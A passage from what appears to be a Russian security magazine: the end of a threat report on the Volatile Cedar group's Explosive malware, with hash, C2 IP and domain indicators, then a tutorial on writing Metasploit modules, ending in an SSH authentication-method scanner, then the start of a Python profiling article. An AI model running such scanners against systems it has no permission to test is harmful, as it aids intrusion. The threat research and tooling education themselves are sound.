лений связан со случаями обнаружения предыдущих версий антивирусным ПО,
что говорит о тщательных попытках злоумышленников скрыть свои действия.
Экспертиза журналов жертв показала, что версии обновлялись практически
всегда автоматически с интервалом в несколько секунд. Последняя модифи-
кация Explosive 3 была выпущена в июне 2014-го.

ЧТО БЫЛО ПОСЛЕ EXPLOSIVE 3?
За те пять месяцев, которые прошли после публикации подробностей о первых
трех версиях Explosive, мы выявили новую конфигурацию. Фактически это тот
же модифицированный Explosive v3.0 с несколькими отличиями:
•  изменилось начальное число алгоритма генерации доменных имен (DGA
   seed), используемое для создания новых серверов C2;
•  единственный сервер, который пока удалось заметить, зарегистрирован
   операторами как getadobeflashplayer.net;
•  все жертвы данной модификации находятся в Саудовской Аравии.

КАКИЕ ЦЕЛИ ПРЕСЛЕДУЮТ ЕЕ СОЗДАТЕЛИ?
Основной целью злоумышленников, по-видимому, является сбор данных,
а не нанесение вреда атакуемым организациям или использование их ресур-
сов и финансовых активов. Среди обнаруженных целей группы — организации,
имеющие отношение к телекоммуникациям, СМИ, веб-хостингу, а также госу-
дарственные, оборонные и научные предприятия. Пока было выявлено лишь
небольшое количество (сотни по сравнению с тысячами) целей злоумышленни-
ков. Обычно от группы, которая планирует атаки на финансовые организации,
мы ожидаем намного больше жертв. Ограниченное число целей может быть
частью попытки избежать ненужной огласки. Примерно десять стран, включая
США, Канаду, Великобританию, Турцию, Ливан и Израиль, вошли в подтверж-
денный список жертв Volatile Cedar.
   Все эти детали указывают на высокую степень подготовки кампании, на-
правленной против конкретных и тщательно отобранных организаций.
  По мнению Анатолия Виклова, консультанта по безопасности Check Point
Software Technologies, данная группировка готовилась весьма тщательно, це-
ленаправленно выбирала мишени, активно отслеживала попытки обнаружения
anti-APT и антивирусными решениями. Атаки велись адресно, с целью избега-
ния ненужной огласки. Все эти меры позволили им оставаться незаметными
в течение трех лет.

КАК ОСУЩЕСТВЛЯЕТСЯ КОНТРОЛЬ СЕТЕЙ?
Злоумышленники используют внутреннюю многоуровневую структуру серве-
ров для управления целевой системой. Эта структура состоит из трех основных
уровней.
• Уровень 1 — серверы C&C: каждый инсталлированный клиент Explosive
   пытается соединиться со своим командным центром управления (C&C)
   для передачи данных из организации-жертвы. Каждая версия Explosive име-
   ет по умолчанию захардкоженный адрес С&С. Различные версии вредонос-
   ного ПО используют различные серверы C&C.
• Уровень 2 — серверы статических обновлений (Static update servers): эти
   серверы периодически подключаются для получения текущего C&C-адре-
   са. Если новый C&C-адрес доступен, сервер С&С по умолчанию связыва-
   ется с этим новым адресом. Статическое обновление адресов С&С также
   жестко закодировано в теле Explosive.
• Уровень 3 — серверы динамических обновлений (Dynamic update servers):
   если статические серверы С&С не отвечают, Explosive использует собствен-
   ный алгоритм DGA и пытается подключиться к серверам динамических об-
   новлений. После подключения эти серверы работают так же, как серверы
   для статического обновления. Некоторые версии Explosive также использу-
   ют серверы динамических обновлений как C&C-серверы.

Структуры серверов разнообразны. Некоторые серверы принадлежат злоу-
мышленникам, также используются серверы на площадках публичного хостин-
га или скомпрометированные частные серверы.

В ЧЕМ ЗАКЛЮЧАЕТСЯ МЕТОД РАБОТЫ VOLATILE CEDAR?
Метод работы Volatile Cedar заключается в атаках на доступные извне веб-сер-
веры. Типичная атака начиналась со сканирования уязвимостей, при этом по-
иск уязвимостей выполнялся как в автоматическом, так и в ручном режиме. За-
тем следовало внедрение веб-шелла на взломанный сайт. На основе данных
жертв было обнаружено, что из всех взломанных сайтов хостинг-сервиса толь-
ко один содержал веб-шелл. Доступ на остальные сайты, по всей видимости,
осуществлялся с использованием украденных учетных данных администратора.
Изучение данных жертв из хостинговых компаний показало, что взлом одного
веб-сайта приводил к взлому практически всех сайтов, находившихся на дан-
ном хостинг-сервисе.
   Получив доступ к серверу и контроль над ним, злоумышленники могли ис-
пользовать его как опорную точку для изучения, идентификации и атак на до-
полнительные ресурсы, находящиеся в сети организации. Исследователи
обнаружили признаки как попыток онлайн-проникновения, так и механизма
распространения вредоносного ПО через зараженные USB-носители.

ПОЧЕМУ ИМЕННО ЛИВАН СЧИТАЕТСЯ ИСТОЧНИКОМ ЭТОЙ АТАКИ?
Размах и неочевидность стратегии этой хакерской кампании вызвали большой
интерес исследователей. Через тщательный анализ действий злоумышленни-
ков, жертв и серверов C2, известных ранее, а также целей, зараженных образ-
цом с вновь обнаруженной конфигурацией, удалось построить карту инфици-
рования.





Карта инфицирования

   Хотя факты инфицирования отмечаются по всему миру, наиболее высокая
концентрация приходится на Ближний Восток, в частности на Израиль, Ливан
и Саудовскую Аравию.
   Если более внимательно посмотреть на цели злоумышленников, то стано-
вится ясно, что распределение самих жертв построено по принципу отрасле-
вой вертикали.





 Распределение жертв

Если присмотреться к распределению взломанных веб-сайтов, размещенных
на хостинг-сервисах, то можно заметить два интересных факта.
1. Пострадавшие сайты на взломанных веб-сервисах в основном относились
   к Ближнему Востоку.
2. Большинство пострадавших сайтов принадлежит различным компаниям,
  работающим с государственными организациями и организациями обо-
   ронной промышленности этого региона.

Эти наблюдения о жертвах позволяют предположить, что организаторы группы
проявляют большой интерес к региону и политическим событиям, которые там
происходят.

Другие факты в пользу Ливана:
•  строки внутри двоичного кода на арабском языке;
•  ресурсы PE внутри вредоносных файлов написаны на ливанском арабском;
•  время компиляций — отметки времени коррелируют с рабочими часами ча-
   сового пояса Ливана (GMT +2);
•  несколько серверов C2 располагаются в Ливане (относится к первой вер-
   сии Explosive).





Строки на арабском языке

Несколько доменов, используемых злоумышленниками, в какой-то момент
были зарегистрированы на ливанские адреса, которые позже были изменены.

ВЫСОКО ЛИ КАЧЕСТВО НАПИСАННОГО КОДА И НАСКОЛЬКО
ЭФФЕКТИВНО БЕЗВЕСТНЫЕ АВТОРЫ ЭТОЙ АТАКИ ЗАМЕТАЛИ
СЛЕДЫ?
Разумеется, при операции такой высокой степени адресности логично ожи-
дать, что организаторы попытаются замести свои следы как можно тщательнее.
Однако на деле они оставили подсказки, позволяющие судить об их личности,
практически на каждом шагу (что и помогло определить их местонахождение).
Во время изучения зараженных машин исследователи обнаружили, что старые
инструменты и данные, собранные вредоносом, не были удалены, тем самым
вероятность раскрытия операции повышалась.
  При столкновении с операцией такого размаха с очень тщательно отобран-
ными целями можно ожидать более высокого качества разработки вредонос-
ной программы. В наши дни даже самые простые вредоносные программы
пакуются таким образом, чтобы избегать обнаружения. Они не содержат бес-
полезных функций и кода либо применяют отвлекающие строки. Все эти мо-
менты были плохо исполнены в Explosive и других инструментах, использован-
ных данной группировкой.

ЕСТЬ ЛИ КАКИЕ-НИБУДЬ ПРОГНОЗЫ?
Исследователи продолжают следить за активностью этой кампании и изучать
ее инструменты. Проблема заключается в том, что, несмотря на свои недора-
ботки, хакеры, как правило, идут на шаг впереди тех, кто обеспечивает безо-
пасность.
   «К сожалению, пример Volatile Cedar типичен. Все без исключения рас-
крытые таргетированные атаки обладают как минимум тремя особенностями.
Во-первых, они остаются незамеченными в течение нескольких лет. Во-вторых,
в процессе их создания и в ходе активной фазы работают высококвалифици-
рованные специалисты, поэтому обнаружение таких преступных групп является
совсем не простой задачей. И самое главное — ущерб от них зачастую слож-
но оценить, поскольку организации-жертвы не готовы раскрывать эти данные.
Кроме того, если архитектуру и логику конкретно взятой кибератаки понять еще
возможно, то вернуться на несколько лет назад и узнать, какие именно данные
собирались, например, в 2012 году и куда они ушли, часто просто невозмож-
но», — говорит Анатолий Виклов.


Хеши Explosive

a00cd6d4d40cd0634c2d301f023b49c477bf9324640c8346a8596f4fceddd5aa
af5490785da0a859c5046791cf28fa5ad617122c21a99687db66356d1f8aefef
22d9e9193a341a617b30f3f9e50634dee0a03760badbeddf5cb34dda85192816
ad7422d6ffa43d4eea1b27d6a4842e69968bd1dde1c741afeba8a3271f9c5656
b74bd5660baf67038353136978ed16dbc7d105c60c121cf64c61d8f3d31de32c
08c0f0e6dadfc8f6a824e20d9de7fdd3e17f8ea115094379833c23834bbf9e79
a177b3a3add8acea3150de93be9f876c4ad8ba606bac5f88f20d682d2a89df57
37f4e9d0153221d9a236f299151c9f6911a6f78fff54c91b94ea64d1f3a8872b
d0f059ba21f06021579835a55220d1e822d1233f95879ea6f7cb9d301408c821
cc83382c823c15abd96cc3fd518f672ac0a6757142aac91a40dcdf1311f27ef9
a98099541168c7f36b107e24e9c80c9125fefb787ae720799b03bb4425aba1a9
e5b68ab68b12c3eaff612ada09eb2d4c403f923cdec8a5c8fe253c6773208baf
0008065861f5b09195e51add72dacd3c4bbce6444711320ad349c7dab5bb97fb
ea335556fecaf983f6f26b9788b286fbf5bd85ff403bb4a1db604496d011be29
bed0bec3d123e7611dc3d722813eeb197a2b8048396cef4414f29f24af3a29c4
b275c8978d18832bd3da9975d0f43cbc90e09a99718f4efaf1be7b43db46cf95
41dd95533d85a0fd099ee79fbb4c8699ae6f9299b74034b8bafa3b0ea4a1fb3a
97ab07c8020aead6ce0d9196e03d3917045e65e8c65e52a16ec6ef660dd96968
bd039bb73f297062ab65f695dd6defafd146f6f233c451e5ac967a720b41fc14
30196c83a1f857d36fde160d55bd4e5b5d50fbb082bd846db295cbe0f9d35cfb
52cb02da0462fdd08d537b2c949e2e252f7a7a88354d596e9f5c9f1498d1c68f
bc12d7052e6cfce8f16625ca8b88803cd4e58356eb32fe62667336d4dee708a3
fc085d9be18f3d8d7ca68fbe1d9e29abbe53e7582453f61a9cd65da06961f751
5d491ea5705e90c817cf0f5211c9edbcd5291fe8bd4cc69cdb58e8d0e6b6d1fe
d8fdcdaad652c19f4f4676cd2f89ae834dbc19e2759a206044b18601875f2726
50414f60d7e24d25f9ebb68f99d67a46e8b12458474ac503b6e0d0562075a985
3bedb4bdb17718fda1edd1a8fa4289dc61fdda598474b5648414e4565e88ecd5
1b76fdbd4cd92c7349bc99291137637614f4fb9598ae29df0a39a422611b86f8
ba168c69866ba2e370c9bfbfe06d5863af0e4b387ce05084928710af3c7c43ce
b74bd5660baf67038353136978ed16dbc7d105c60c121cf64c61d8f3d31de32c
03641e5632673615f23b2a8325d7355c4499a40f47b6ae094606a73c56e24ad0
ef47aaf4e964e1e1b7787c480e60a744550de847618510d2bf54bbc5bda57470
1952fa94b582e9af9dca596b5e51c585a78b8b1610639e3b878bbfa365e8e908
dea53e331d3b9f21354147f60902f6e132f06183ed2f4a28e67816f9cb140a90
973fbccbc6d917883d502c88cb7fadfc1a5657adbec377c7a4ed77292ebaeda9
5a310669920099cd51f82bc9eb5459e9889b6357a21f7ce95ac961e053c79acb
37f4e9d0153221d9a236f299151c9f6911a6f78fff54c91b94ea64d1f3a8872b
d0f059ba21f06021579835a55220d1e822d1233f95879ea6f7cb9d301408c821
5663b2d4a4aec55d5d6fb507e3fdcb92ffc978d411de68b084c37f86af6d2e19
388f5bc2f088769b361dfe8a45f0d5237c4580b287612422a03babe6994339ff
bdef2ddcd8d4d66a42c9cbafd5cf7d86c4c0e3ed8c45cc734742c5da2fb573f7
bfc63b30624332f4fc2e510f95b69d18dd0241eb0d2fcd33ed2e81b7275ab488
07529fae9e74be81fd302d022603d9f0796b4b9120b0d6131f75d41b979bbca5
d30f306d4d866a07372b94f7657a7a2b0500137fe7ef51678d0ef4249895c2c5
6674ffe375f8ab54cfa2a276e4a39b414cf327e0b00733c215749e8a94385c63
e2e6ed82703de21eb4c5885730ba3db42f3ddda8b94beb2ee0c3af61bc435747
f46ca3838f1843961a95274afc403300ba8c9cc7562f9fc1316f88f9453d3ec7
e463fdd4f769ea2d12cbe5a362edfba75fb251fe1b69c7437514a0f9863ee998
88cac72f0c754cca4f110e518476722497cb49465e69b10a030cd3f1b1b969c0
3becda7d601cf482d7ef236da6342239684694ed141a911601f321616440f6fa
35dcb7e62bac287e4e3f1fdcefdbf71e5dfe539208c36537ca1bbdce6749e612
f5c68a3ee7cc9ef8126687f035f9e46cdb90f03b4d3e10aaee38ad0793ee661a
a177b3a3add8acea3150de93be9f876c4ad8ba606bac5f88f20d682d2a89df57
47f45532108686fa535dbc32b5356f2005dc13c90f399170fa880ebd530f4645
af5490785da0a859c5046791cf28fa5ad617122c21a99687db66356d1f8aefef
487d8841582cb01231379fbffd7df87d4253c5dd3c26b06756490000d1ee1e82
ad7422d6ffa43d4eea1b27d6a4842e69968bd1dde1c741afeba8a3271f9c5656
08c0f0e6dadfc8f6a824e20d9de7fdd3e17f8ea115094379833c23834bbf9e79


Хеши веб-шеллов

5953c9bf800c67b67f1a3d9691119488d3a1d6e6c6691f8a15d28436cd7122a7
d7cb6fc59d81e935764653f99dd2cbf38aff7b1bf2a423e3846dcb17c52d871e
493007afc73a3d6573b2b53457d6c82e24e16591807565d6caf3e5b6b5d407a2
e33118afd512762c79d840b782dd5cfa2472c97613103e60f8d5427a0a26beb3
b64d6e0e09b6daab209d14f2e684d819433605763208fbfc901a9ab7fd62ce05
a616c039b0ffa2682f001a6978c5edfaac2c3f828b6b18de6bc91f4abaa2d9bb
c103c3c0a1d7983ca1951a72800346fad32a67b4be013a97361a3d85e0e8cd98
d1299a5c75882de2407f50b47c8a111349d4660e5b3fb7fdedfc4cfc2ef98a91
2f2e794064e28a4cd6eb0c0e10d929453367c4b01a55fadf15037817c55e9cdb
e584e0ae44a507d71cf97b490ea6a7ba9ce23b99f5c8bc6875ce60efa6bdf3df
4de07466f24a26311fe011f92c8b04e7c2c3ef4df8f5853bde523404ac06c34f
1dc13fe7f576f5c5ccac4230bdf2122d8351dd50266d0b712291ce59d1c788ae
709137152c150345578348529485afcfc711ba3cf1f55943f963809d3597adf7


Хеши других инструментов

22d9e9193a341a617b30f3f9e50634dee0a03760badbeddf5cb34dda85192816
26e64f95ee23a6ec3b9fb8f937bed8e6ea247379b1f0b2e95ef071dc113b420c


Командно-контрольные серверы

69.64.90.94
50.60.129.74
85.25.20.27
213.204.122.130
213.204.122.133
184.107.97.188
69.94.157.80


Командно-контрольные серверы статического
и динамического обновления

saveweb.wink.wk
carima2012.site90.com
explorerdotnt.info
dotnetexplorer.info
dotntexplorere.info
xploreredotnet.info
erdotntexplore.info
getadobeflashplayer.net
Кодинг
     КОДИНГ
  ДЛЯ ПЕНТЕСТЕРА





       РАЗРАБАТЫВАЕМ МОДУЛИ
          ДЛЯ METASPLOIT





                                    Михаил Овчинников
                                                    michail@ovchinnikov.cc





В статье из прошлого номера мы познакомились с те-
оретической частью и провели небольшой «пентест»
WordPress. В этой статье я буду призывать тебя ко-
пать глубже, вспомнив, что хакер — это в первую оче-
редь программист :). Действительно, несмотря на то
что счет встроенных в Metasploit модулей уже пошел
на тысячи, рано или поздно любой, кто плотно рабо-
тает с фреймворком, сталкивается с необходимостью
расширить его функциональность собственными экс-
плоитами и вспомогательными модулями. Сегодня
мы рассмотрим все необходимые аспекты создания
модуля с нуля, а заодно коснемся особенностей язы-
ка Ruby, которые нужно учитывать при написании.


ОРГАНИЗАЦИЯ ФАЙЛОВ В MSF
Прежде чем приступать к написанию своего модуля, необходимо разобрать-
ся со структурой файлов в фреймворке и механизмом поиска модулей. Файлы
Metasploit располагаются в двух основных локациях.
   Первая — это директория, куда был установлен фреймворк. Например,
в Kali Linux это /usr/share/metasploit-framework. В папке lib, помимо про-
чего, мы можем обнаружить библиотеку Rex, которая предоставляет базовые
методы для работы с файлами и протоколами. Основа фреймворка — библи-
отеки Core и Base располагаются в директории lib/msf. Практикующим ос-
новательный подход можно начать изучение исходных кодов с класса Module
из lib/msf/core, который определяет базовое поведение модулей. От него,
в свою очередь, наследуются классы, которые определяют тип модуля Auxiliary,
Exploit, Payload и так далее (их можно найти там же). Модули, идущие в постав-
ке с фреймворком, можно обнаружить в директории modules, где они разбиты
по типам.
   Вторая локация — директория .msf4 в домашней папке пользователя. Имен-
но она рекомендуется авторами фреймворка в качестве основного хранилища
всех внешних модулей. Ее структура должна быть аналогична структуре папки
modules. Например, если ты скачал эксплоит от внешнего разработчика или
написал его сам, то, чтобы MSF распознал его, он должен находиться по пути
~/.msf4/modules/exploits. Внутри этой локации рекомендуется сортировать
модули по подпапкам, например по операционным системам — MSF распоз-
нает их. Например, путь ~/.msf4/modules/exploits/windows/module_name
будет валиден с точки зрения фреймворка.

АРХИТЕКТУРА МОДУЛЯ
Предлагаю рассмотреть базовый шаблон модуля, который не будет произво-
дить полезного действия, но будет корректно распознаваться MSF.
   Подключим библиотеки, составляющие ядро фреймворка, которые распо-
лагаются в msf/core, при помощи ключевого слова require.

require 'msf/core'

Далее необходимо отнаследоваться от класса, который определит тип модуля.
В нашем случае это будет Auxiliary.

class Metasploit3 < Msf::Auxiliary

Название класса Metasploit3 определяет версию фреймворка, для которого
пишется модуль.
  Определим метод initialize, который выполняет функцию конструктора
класса в Ruby.

def initialize
  super(
    'Name' => 'Hello world Module',
    'Description' => 'Useless module for education purposes',
    'Author' => 'Xakep',
    'License' => MSF_LICENSE
  )
end

Ключевое слово super используется в Ruby при наследовании, когда не тре-
буется полностью переопределять метод, а необходимо лишь дополнить его
поведение. Происходит вызов метода с таким же именем в родительском клас-
се, и ему передаются необходимые параметры. В данном случае будет вызван
метод initialize родительского класса Auxiliary, а в качестве параметров
ему будет передан хеш (пары ключ — значение) с метаданными: название мо-
дуля, его описание, автор и лицензия.
   Следующее, что потребуется определить, — это непосредственно сам ме-
тод, который будет выполнять какое-либо полезное действие. В нашем случае
он будет выводить строку c приветствием. Естественно, в реальных модулях ме-
тодов будет гораздо больше, в чем ты сможешь убедиться, исследовав встро-
енные модули MSF. Название метода должно быть run.

def run
  puts 'Hello from MSF module!'
end

Приведу полный код нашего первого модуля:

require 'msf/core'
class Metasploit3 < Msf::Auxiliary
  def initialize
    super(
      'Name' => 'Hello world Module',
      'Description' => 'Useless module for education purposes',
      'Author' => 'Xakep',
      'License' => MSF_LICENSE
    )
  end
  def run
    puts 'Hello from MSF module!'
  end
end

Сохраняем его в директорию ~/.msf4/modules/auxiliary/xmodules в файл
под названием hello.rb. Теперь запускаем консоль Metasploit (командой
msfconsole). После загрузки консоли можно обратить внимание, что число
auxiliary-модулей увеличилось на один.
   Если этого не произошло и модуль по причине ошибки не был загружен, то
увидеть сообщение об этом можно выше вместе с остальной загрузочной ин-
формацией.





Сообщение об ошибке при загрузке модуля

Мы можем найти наш модуль по слову hello либо сразу выбрать его для работы:

use auxiliary/xmodules/hello

Как можно заметить, команде use мы передаем структуру, которая повторя-
ет путь к файлу (начиная от директории modules), без расширения. Осталось
только запустить модуль командой run и увидеть сообщение, которое мы ука-
зали в одноименном методе.

                                                    Результат запуска нашего
                                                простейшего модуля




ПРОСТОЙ МОДУЛЬ ДЛЯ РАБОТЫ С SSH
Рассмотренного выше минимального примера должно быть достаточно, чтобы
понять, что собой представляют модули и как с ними работает Metasploit. Од-
нако необходимо раскрыть дополнительно несколько важных особенностей,
и для этого мы напишем более практический пример.
   Предлагаю решить следующую задачу: дан список IP-адресов, нужно напи-
сать auxiliary-модуль, который определит, доступен ли этот сервер по SSH, и,
если доступен, определит возможные типы авторизации.
  Помимо образовательных целей, такой модуль будет полезен и для просто-
го админа, и для пентестера: получив список хостов каждого типа, можно будет
натравить на них один из соответствующих встроенных модулей уже с целью
проверки на стойкость используемого пароля или ключа.
  Подключим необходимые библиотеки.

require 'msf/core'
require 'net/ssh'
require 'stringio'
require 'logger'
                                   WWW
Отметим, что подключается модуль Scanner, который со-
                                                                         Полное описание
держит готовые методы для соответствующих операций.                                                                         принципов загрузки
                                                                         внешних модулей
class Metasploit3 < Msf::Auxiliary                               в Wiki MSF на GitHub
  include Msf::Auxiliary::Scanner

Здесь нужно понять механизм примесей (mixin), который довольно активно ис-
пользуется при написании модулей. В контексте Ruby также существует понятие
модуля — это способ организации методов, классов и констант, он может ис-
пользоваться как аналог пространств имен в других языках (namespaces) либо
для реализации своего рода множественного наследования, которое и полу-
чило название mixin. Для его реализации необходимо подключить библиотеку,
содержащую модуль (в данном случае он является частью msf/core), а затем
в нужном месте подключить модуль при помощи ключевого слова include. Так
класс нашего модуля унаследует все методы базового модуля Scanner.
   Код метода initialize будет уже знакомым.

def initialize
  super(
    'Name' => 'SSH Auth type checker',
    'Description' =>
        'Check host availability by SSH and detect auth type',
    'Author' => 'Xakep',
    'License' => MSF_LICENSE
  )
  register_options(
    [
      Opt::RPORT(22)
    ], self.class
  )
end

Можно заметить, что здесь я зарегистрировал опцию RPORT. Это те самые
опции, которые выставляются при помощи команды set в консоли Metasploit.
Кстати, если ты посмотришь информацию о модуле командой info, то увидишь
и другие опции: они зарегистрировались модулем Scanner, который я упоминал.





Опции, доступные нашему модулю

Метод run также реализован в Scanner, и в данном случае нет смысла его пе-
реопределять. Зато этот модуль предоставляет нам более удобный метод под
названием run_host, которому передается IP-адрес. Этот код будет выполнять-
ся для каждого хоста.

  def run_host(ip)
    debug_info = StringIO.new
    log = Logger.new debug_info
    opts_hash = {
      port: datastore['RPORT'],
      verbose: Logger::DEBUG,
      logger: log,
      timeout: 5
   }
  begin
    Net::SSH.start(ip, 'user', opts_hash) do
      method = extract_succeded_method(debug_info.string)
      print_good("#{ip} - connection established, auth method: #{method}")
    end
  rescue Net::SSH::AuthenticationFailed
    methods = extract_auth_methods(debug_info.string)
    print_debug("#{ip} - auth failed, available methods: #{methods}")
  rescue Timeout::Error, Errno::ECONNREFUSED, Rex::ConnectionRefused
    print_error("#{ip} - host doesn't respond")
  end
end

В нем мы сначала определяем переменные служебного характера, они требу-
ются для того, чтобы лог подключения писался в переменную, а не выводился
на консоль. Затем определяется хеш с опциями. В нем мы указываем, что порт
берем из опции RPORT, которую определили в методе initialize, далее вы-
ставляем «многословность» логирования в режим Debug, чтобы получить ин-
тересующую нас информацию, определяем какому экземпляру объекта Logger
отдавать лог, и последним параметром идет тайм-аут подключения.
   Теперь при помощи модуля Net::SSH (мы подключали его в начале, он вхо-
дит в состав MSF) запускаем сессию, передав ей IP-адрес хоста, имя пользо-
вателя (в данном случае оно неважно, поэтому я поставил просто 'user') и хеш
с настройками. Далее все просто: если вдруг удалось подключиться и автори-
зоваться, то выводим соответствующее сообщение, где вытягиваем из лога
метод, которым было авторизовано соединение. Если авторизация провали-
лась (что в данном случае ожидаемый исход), то мы достанем из лога доступ-
ные методы авторизации для данного хоста. Если же хост недоступен по раз-
ным причинам, то напечатаем соответствующее сообщение. Обрати внимание
на специальные методы для вывода информации на консоль MSF: print_good,
print_debug и print_error. Они нужны, чтобы подсвечивать результаты соот-
ветствующими символами, для более легкого чтения.
   Для получения информации из лога я написал два вспомогательных метода,
которые достают при помощи регулярных выражений нужные строчки (далеко
не самый оптимальный вариант, здесь используется для простоты).

def extract_auth_methods(debug_info)
  debug_info
    .match(/allowed\smethods:\s(.+)/)
    .captures
     .first
end                                            WARNING
def extract_succeded_method(debug_info)
                                                                        Вся информация  debug_info                                                                             предоставлена
    .match(/(.+)\ssucceeded/)                                     исключительно
    .captures                                                        в ознакомительных целях.
                                                                Ни редакция, ни автор     .first
                                                                       не несут ответственности
end                                                                          за любой возможный вред,
                                                                    причиненный материалами
Привожу полный код модуля:                                         данной статьи.

require 'msf/core'
require 'net/ssh'
require 'stringio'
require 'logger'
class Metasploit3 < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  def initialize
    super(
      'Name' => 'SSH Auth type checker',
      'Description' =>
          'Check host availability by SSH and detect auth type',
      'Author' => 'Xakep',
      'License' => MSF_LICENSE
    )
    register_options(
      [
        Opt::RPORT(22)
      ], self.class
    )
  end
  def run_host(ip)
    debug_info = StringIO.new
    log = Logger.new debug_info
    opts_hash = {
      port: datastore['RPORT'],
      verbose: Logger::DEBUG,
      logger: log,
      timeout: 5
    }
    begin
      Net::SSH.start(ip, 'user', opts_hash) do
        method = extract_succeded_method(debug_info.string)
        print_good(
            "#{ip} - connection established, auth method: #{method}")
      end
    rescue Net::SSH::AuthenticationFailed
      methods = extract_auth_methods(debug_info.string)
      print_debug(
          "#{ip} - auth failed, available methods: #{methods}")
    rescue Timeout::Error, Errno::ECONNREFUSED, Rex::ConnectionRefused
      print_error("#{ip} - host doesn't respond")
    end
  end
  def extract_auth_methods(debug_info)
    debug_info
      .match(/allowed\smethods:\s(.+)/)
      .captures
       .first
  end
  def extract_succeded_method(debug_info)
    debug_info
      .match(/(.+)\ssucceeded/)
      .captures
       .first
  end
end

Теперь осталось только выбрать модуль в консоли MSF, указать адреса хостов
через установку опции RHOSTS, запустить модуль и увидеть результат.





Результат выполнения нашего модуля

ДОМАШНЕЕ ЗАДАНИЕ
Сейчас наш модуль выводит информацию только в консоль, что может быть
не совсем удобным для дальнейших исследований. Предлагаю тебе самосто-
ятельно изучить документацию модуля Msf::Auxiliary::Report и прикрутить
к этому примеру логирование в базу и/или в файл.

ИТОГ
Мы рассмотрели много особенностей модулей MSF, поэтому предлагаю
для окончательного закрепления информации пробежаться по основным эта-
пам написания модуля.
•  Подключаем необходимые библиотеки при помощи ключевого слова
   require. При построении модулей можно (и нужно) использовать библиоте-
   ки, которые располагаются в директории lib. Прежде всего это Rex и Core,
   в которых реализовано множество готового функционала.
•  Объявляем класс, который наследуется от базового класса соответствую-
  щего типу модуля, в зависимости от желаемого поведения модуля.
• В Ruby нет множественного наследования, зато есть механизм примесей,
   который позволит тебе подключать нужные модули при помощи ключевого
   слова include после объявления класса.
•  Определяем методы:
   • initialize — в него вносим информацию о модуле и определяем опции;
   • методы, выполняющие полезное действие, в зависимости от типа модуля
    и нужд.
Mobile
ПРОФИЛИРОВЩИКИ
ДЛЯ PYTHON
ИЗМЕРЯЕМ СКОРОСТЬ
ВЫПОЛНЕНИЯ НАШИХ
ПРИЛОЖЕНИЙ





               Иван Колодяжный
                   e0ne@e0ne.info



В прошлой статье («Python на стероидах», 198-й но-
мер) мы поговорили о профилировании Python-при-
ложений. Судя по полученному фидбэку, тема оказа-
лась интересной, и, выходит, теперь, когда мы уже
попробовали все на практике, настало время позна-
комиться с теорией :). В этой статье я постараюсь
рассказать о том, что вообще такое производитель-
ность ПО, как и зачем ее измерять, и закончу тему
с профилированием. В следующий раз мы углубимся
в тему тестирования производительности ПО в тео-
рии и на практике.

А БЫСТРО ЛИ ВСЕ РАБОТАЕТ?
 Итак, зачем нам вообще измерять скорость работы на-
шего софта? Чаще всего скорость работы ПО измеряют
 в двух случаях: когда пользователи начинают жаловаться
на то, что все тормозит, и когда в техническом задании
написано что, например, страница разрабатываемого
                                               WARNING сайта должна открываться не медленнее, чем N секунд.
Скорость работы — это вообще, на мой взгляд, мифиче-      Никогда не забывай,
 ское понятие в вакууме.                                                  что преждевременная
                                                                        оптимизация — это еще   Поэтому я предпочитаю использовать более конкрет-                                                                                хуже, чем ее отсутствие.
ные определения: «скорость работы функции А низкая»                                                                         Используй профайлеры
или «при тысяче пользователей онлайн наш сайт отвеча-       только тогда, когда
 ет на запросы более трех секунд». При таком подходе        это действительно
                                                                              необходимо.
 становится ясно не только что нужно измерять, но и что
именно мы подразумеваем под скоростью работы софта.
Ведь в зависимости от того, что ты разрабатываешь, измерять необходимо со-
вершенно разные вещи. Например, при разработке веб-сайта главное, чтобы
 пользовательский интерфейс быстро реагировал на действия пользователя,
и нам может быть абсолютно безразлично, сколько времени занимает запрос
 к базе данных, когда это работает асинхронно, а если мы пишем ORM, то важ-
нейшим показателем скорости работы для нас будет скорость выполнения ге-
нерируемых запросов.

Python vs C или С vs Assembler
По этой же причине сложно сравнивать скорость рабо-
 ты языков программирования, ведь в конечном итоге
нам неважно, сколько выполняется операция возведения
 в степень, нам нужно, чтобы скорость работы конкретной
фичи в конкретном приложении была не ниже заданно-
                                                         INFO
 го значения. Поэтому различные холивары на тему «что
быстрее — Python или Ruby» не имеют никакого смысла.        Из Википедии:
Можно измерить скорость работы «Hello, world», но прак-      производительность
                                                                            софта — это тической пользы в этом нет никакой.                                                                                количественная
   То же самое касается и сравнения скорости работы         характеристика
разных фреймворков. Пользы от такого сравнения гораз-      скорости выполнения
                                                                            определенныхдо больше, чем от сравнения языков программирования,                                                                             операций
но все-таки не стоит воспринимать эти данные как истину
 в последней инстанции. На мой взгляд, такие сравнения
 годятся только для того, чтобы понять, как фреймворки ведут себя со стандарт-
ными настройками. Они показывают общие тенденции, но не могут дать точ-
 ного ответа на вопрос, что подойдет именно тебе для использования в новом
 мегапроекте. Например, совершенно бесполезно вычислять скорость работы
веб-фреймворка при чтении из базы данных. Ведь самое простое кеширова-
ние позволит практически уравнять их все по скорости чтения из БД. При этом
 в твоем проекте базы данных может вообще не быть, а все данные будут при-
 ходить из других источников (файлы, различные API и так далее). Поэтому еще
раз повторю: определяй скорость только тех операций, которые нужны именно
 тебе, а не автору теста.

Рис. 1. Оптимизируем правильные участки программы





С ЧЕГО ВСЕ НАЧАЛОСЬ
Первые профайлеры появились еще в начале семидесятых для IBM/360
и IBM/370. Утилита для анализа производительности performance-analysis tool
работала на основе прерываний и, по сути, была, наверное, первым статистиче-
ским профилировщиком. Позже, в 1979-м, в составе UNIX появился профайлер
 prof, что стало началом разработки ПО с использованием профилировщиков.
После запуска prof выводил время, которое потребовалось для выполнения ка-
ждой функции программы.
   Позже, в 1982 году, появился на свет gprof, который в 1983-м вошел в со-
 став известного 4.2BSD. Тогда же была опубликована статья под названием
 «Gprof: a Call Graph Execution Profiler». В 1988-м gprof был переписан и включен
 в состав GNU Binutils, который входит в любой современный *nix-дистрибутив.
 Gprof расширил функциональность своего родителя и имел возможность стро-
 ить граф вызовов функций.
   Спустя шесть лет компания DEC опубликовала документ, описывающий
фреймворк Analysis Tools with OM, — «ATOM: A system for building customized
 program analysis tools». ATOM позволял инструментировать софт (проще гово-
ря — встроить свой код) для последующего анализа скорости выполнения кода.

СОВРЕМЕННЫЕ ПРОФИЛИРОВЩИКИ
Сейчас существует огромное количество всевозможных профайлеров для раз-
ных языков программирования. Есть и универсальные профилировщики, кото-
